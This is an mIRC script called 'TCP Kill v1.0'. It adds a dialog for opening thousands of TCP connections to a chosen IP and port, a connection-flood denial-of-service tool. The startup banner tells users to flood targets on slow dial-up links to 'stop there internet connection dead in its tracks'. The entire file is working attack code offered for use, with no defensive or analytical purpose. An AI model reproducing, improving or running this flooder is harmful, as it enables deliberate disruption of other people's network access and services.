on *:load: {
  echo -s 4-
  echo -s 12[4-0:4TCP Kill 14v1.00:4-12]
  echo -s 14Written By K|nG a.k.a K|nG a.k.a K|nG
  echo -s 14To use type the number of times in the times box,port to connect to in the port box,and the ip in the server box
  echo -s 14Then click start,to stop,click stop
  echo -s 4-14NOTE4-
  echo -s 14If they have a faster connection than u or they use cable or dsl it wont do much but lag
  echo -s 14Else,if they use 28.8k or 56k and u connection flood them,u might possibly make enough connections
  echo -s 14And stop there internet connection dead in its tracks
  echo -s 14If you have the same connection speed,it may take quit a time,or affect u both in the same way
  echo -s 14And in some cases,not work or take a VERY long time to work or even lag them
  echo -s 4-14End Of Note4-
  echo -s 14Peace
  echo -s 12[4-0:4TCP Kill 14v1.00:4-12]
  echo -s 4-
}
menu status,menubar,channel {
  (-TCP Kill-)
  ..(-Open TCP Kill-):tcpkill
}
dialog tcpkill {
  title "TCP Kill v1.0"
  size -1 -1 100 95
  option dbu
  box "TCP Kill:", 1, 0 0 100 72
  text "Server:", 2, 3 13 18 8
  edit "", 3, 24 12 70 10, autohs
  text "Port:", 4, 4 25 15 8
  edit "", 5, 24 24 28 10, autohs
  text "Data:", 6, 4 36 15 8
  edit "", 7, 24 36 70 10, multi autohs autovs
  text "Times:", 8, 3 48 18 8
  edit "10000", 9, 24 48 23 10, multi autohs autovs
  button "Start", 10, 2 61 48 9, flat
  button "Stop", 11, 50 61 48 9, flat
  box "Status:", 12, 0 74 100 21
  edit "", 13, 2 83 96 10, multi autohs autovs
}
on *:dialog:tcpkill:sclick:10: {
  unset %tcp.*
  if ($did(3) == $null) || ($did(5) == $null) || ($did(5) == 0) || ($did(9) == $null) || ($did(9) == 0) { did -ra tcpkill 13 Error:Fill In All Edit Boxes | halt }
  set %tcp.ip $did(3)
  set %tcp.port $did(5)
  set %tcp.times $did(9)
  set %tcp.inc 0
  if ($did(7) != $null) { var %tcp.msg = $did(7) }
  did -ra tcpkill 13 TCP Flooding %tcp.ip on %tcp.port %tcp.times times
  timertcpflood $+ $r(0,9) %tcp.times 0 tcpflood 
}
on *:dialog:tcpkill:sclick:11: { unset %tcp.* | timertcpflood* off | did -ra tcpkill 13 TCP Kill Halted. | halt }
alias tcpkill { dialog -md tcpkill tcpkill }
alias tcpflood {
  sockopen tcp.kill. $+ $r(0,9999999) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $time $+ $ticks %tcp.ip %tcp.port
}
on *:sockopen:tcp.kill.*: {
  if ($sockerr > 0) { timertcpflood* off | unset %tcp.* | did -ra tcpkill 13 Error:Could Not Connect,Either U Have Just Flooded Them And Disconnected Them Or Port $sock($sockname).port is closed | halt }
  if (%tcp.msg != $null) { sockwrite $sockname %tcp.msg | inc %tcp.inc 1 | did -ra tcpkill 13 Times Connected: $+ %tcp.inc | return }
  inc %tcp.inc 1
  did -ra tcpkill 13 Times Connected: $+ %tcp.inc  
  return 
}
